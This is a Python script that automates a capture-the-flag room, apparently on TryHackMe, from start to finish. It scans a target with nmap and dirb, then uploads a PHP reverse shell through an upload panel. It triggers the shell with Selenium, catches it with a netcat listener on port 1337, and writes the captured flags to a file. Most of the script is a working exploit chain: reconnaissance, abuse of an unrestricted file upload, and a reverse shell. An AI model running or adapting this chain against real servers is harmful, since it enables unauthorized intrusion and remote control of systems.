import os
import re
import time
import subprocess
from selenium import webdriver
import requests
from multiprocessing import Process


ipaddress = input("Please write target ip address : ")

def is_valid_ip_address(ip):
    # Define a regular expression pattern for a valid IPv4 address
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'

    # Use the `match()` function from the `re` module to check if the input matches the pattern
    if re.match(pattern, ip):
        # If the input matches the pattern, split the address into its four octets and check if each octet is between 0 and 255
        octets = ip.split('.')
        if all(0 <= int(octet) <= 255 for octet in octets):
            return True
    # If the input doesn't match the pattern or the octets are out of range, return False
    return False


def execute_Command(command):
    os.popen(command).read()


def get_Flags():

    print("nmap command is working...")
    time.sleep(5)
    
    nmap_command = " sudo nmap -sS -sV {} >~/Desktop/output.txt".format(ipaddress)
    execute_Command(nmap_command)

    print("output.txt is created")
    time.sleep(5)

    get_flag_1 = "echo flag_1 = $(grep -E open ~/Desktop/output.txt | wc -l) open ports > ~/Desktop/flags.txt" 
    execute_Command(get_flag_1)
    
    get_flag_2 = "echo flag_2 = $(grep -E 'Apache' ~/Desktop/output.txt | cut -d ' ' -f 10) is Apache version >> ~/Desktop/flags.txt"
    execute_Command(get_flag_2)
    
    get_flag_3 = "echo flag_3 = $(grep -E '22' ~/Desktop/output.txt | cut -d ' ' -f 4 | tail -n1 ) is running on 22 >> ~/Desktop/flags.txt"
    execute_Command(get_flag_3)
    
    get_flag_4 = "echo flag_4 = just press completed button >> ~/Desktop/flags.txt"
    execute_Command(get_flag_4)
    
    dirb_command = "dirb http://{ip} ~/Desktop/wordlist.txt > ~/Desktop/subdirectories.txt".format(ip=ipaddress)
    execute_Command(dirb_command)
    
    get_flag_5 = "echo flag_5 = $(grep {ip} ~/Desktop/subdirectories.txt | cut -d '/' -f 4 | sort | uniq | grep panel | head -n1) >> ~/Desktop/flags.txt".format(ip=ipaddress)
    execute_Command(get_flag_5)

    #execute other functions to get the rest of the flags
    print("File is uploading...")
    
    time.sleep(5)

    upload_File()

    print("Getting privilege escalation...")

    time.sleep(5)
    
    get_Shell()

    print("Privilege escelation is succesfully done")
    
    get_flag_6 = "echo flag_6 = $(grep THM ~/Desktop/nc_result.txt| head -n1)>>~/Desktop/flags.txt"
    execute_Command(get_flag_6)

    get_flag_7 = "echo flag_7 = $(grep /usr/bin/python ~/Desktop/nc_result.txt)>>~/Desktop/flags.txt"
    execute_Command(get_flag_7)

    get_flag_8 = "echo flag_8 = just press completed button >> ~/Desktop/flags.txt"
    execute_Command(get_flag_8)
    
    get_flag_9 = "echo flag_9 = $(grep THM ~/Desktop/nc_result.txt| tail -n1)>>~/Desktop/flags.txt"
    execute_Command(get_flag_9)

    print("flags.txt is succesfully created and flags is ready to complete the CTF")
    time.sleep(5)

    

    


def upload_File():
    # Define the URL of the webpage to upload the file to
    url = 'http://{}/panel/'.format(ipaddress)

    # Define the file path of the file to upload
    file_path = '/home/kali/Desktop/php-reverse-shell.php5'

    # Open the file in binary mode and read its contents
    with open(file_path, 'rb') as file:
        file_content = file.read()

    # Define the file name and MIME type
    file_name = 'php-reverse-shell.php5'
    file_mime_type = 'php5'

    # Define the request headers
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }

    # Define the request data
    data = {
        'submit': 'Upload'
    }

    # Define the file to be uploaded
    files = {
        'fileUpload': (file_name, file_content, file_mime_type)
    }

    # Send the POST request with the file upload
    response = requests.post(url, headers=headers, data=data, files=files)

    # Check the response status code
    if response.status_code == 200:
        print('File uploaded successfully')
    else:
        print('Error uploading file')


def nc_Command():
    result = subprocess.run(["nc", "-nlvp", "1337"], capture_output=True, text=True)

    # Write the output to a file
    with open('nc_result.txt', 'a') as f:
        f.write(result.stdout)
    


def click_File():
    # specify the path to your geckodriver
    driver = webdriver.Firefox()

    # navigate to the web page
    driver.get(f'http://{ipaddress}/uploads/php-reverse-shell.php5')
    driver.quit()

    

def get_Shell():
    nc_process = Process(target=nc_Command)
    nc_process.start()

    web_automation_process = Process(target=click_File)
    web_automation_process.start()

    nc_process.join()
    web_automation_process.join()


    
while True:
    is_valid = is_valid_ip_address(ipaddress)
    print("IP address is checking...")
    time.sleep(5)
    if is_valid:
        get_Flags()
        break
    else:
        print("Please write valid IP address")
        reload = input("Do you want to reload the program? (Y/N)").lower()
        if reload == "n":
            print("Have a good day:)")
            break
        else:
            ipaddress = input("Please write target ip address : ")

        